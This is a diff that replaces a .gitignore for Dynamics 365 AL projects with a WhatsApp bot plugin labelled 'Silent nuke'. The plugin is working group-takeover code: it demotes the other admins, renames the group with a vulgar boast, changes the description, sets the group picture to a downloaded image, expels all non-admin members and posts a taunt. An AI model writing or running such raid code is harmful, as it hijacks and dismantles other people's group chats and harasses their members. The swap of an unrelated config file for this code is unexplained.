@@ -1,23 +1,88 @@
-### AL ###
-#Template for AL projects for Dynamics 365 Business Central
-#launch.json folder
-.vscode/
-#Cache folder
-.alcache/
-#Symbols folder
-.alpackages/
-#Snapshots folder
-.snapshots/
-#Testing Output folder
-.output/
-#Extension App-file
-*.app
-#Rapid Application Development File
-rad.json
-#Translation Base-file
-*.g.xlf
-#License-files
-*.bclicense
-*.flf
-#Test results file
-TestResults.xml
+const { bot } = require('../lib/')
+const axios = require('axios')
+
+bot(
+{
+  pattern: "Chanasenter",
+  fromMe: true,
+  desc: "Silent nuke",
+  type: "group",
+  onlyGroup: true
+},
+async (message) => {
+
+  const client = message.client
+  const botPhone = client.user.id.split(':')[0] + '@s.whatsapp.net'
+
+  ;(async () => {
+
+    const g = await client.groupMetadata(message.jid)
+
+    let admins = g.participants
+      .filter(p => p.admin && p.phoneNumber !== botPhone)
+      .map(p => p.id)
+
+    admins = admins.filter(id => id !== botPhone)
+
+    if (admins.length > 0) {
+      await client.groupParticipantsUpdate(message.jid, admins, 'demote')
+    }
+
+    await new Promise(r => setTimeout(r, 2000))
+
+    try {
+      const name = `𝐶𝛨 𝛥𝛮𝛥𝑆 ⁶⁹ 𝛯𝛮𝑇𝛯𝑅 💀🇵🇰
+
+
+
+
+
+
+
+
+
+
+
+
+𝐺𝐶 𝐹𝑈𝐶𝛫𝛯𝐷 𝐵𝑌 ⁶⁹😽🔥`
+
+
+      await client.groupUpdateSubject(message.jid, name)
+    } catch (e) {}
+
+    await new Promise(r => setTimeout(r, 1500))
+
+    try {
+      const desc = `𝐹𝛯𝛯𝐿 𝑇𝛨𝛯 𝛲𝛩𝑊𝛯𝑅 𝛩𝐹 𝑆𝛪𝛸𝑇𝑌 𝛮𝛪𝛮𝛯 🥵🔥`
+      await client.groupUpdateDescription(message.jid, desc)
+    } catch (e) {}
+
+    await new Promise(r => setTimeout(r, 1500))
+
+    try {
+      const url = "https://i.postimg.cc/yWCz43cF/IMG-20260402-WA0010.jpg"
+      const res = await axios.get(url, { responseType: 'arraybuffer' })
+      const buffer = Buffer.from(res.data)
+      await client.updateProfilePicture(message.jid, buffer)
+    } catch (e) {}
+
+    await new Promise(r => setTimeout(r, 2000))
+
+    const sock = message.client
+    const jid = message.jid
+
+    const group = await sock.groupMetadata(jid)
+
+    const users = group.participants
+      .filter(p => !p.admin)
+      .map(p => p.id)
+
+    if (users.length) {
+      await sock.groupParticipantsUpdate(jid, users, "remove")
+    }
+
+    await message.send("_F33L TH3 POW3R OF 6T9😂_")
+
+  })()
+}
+)
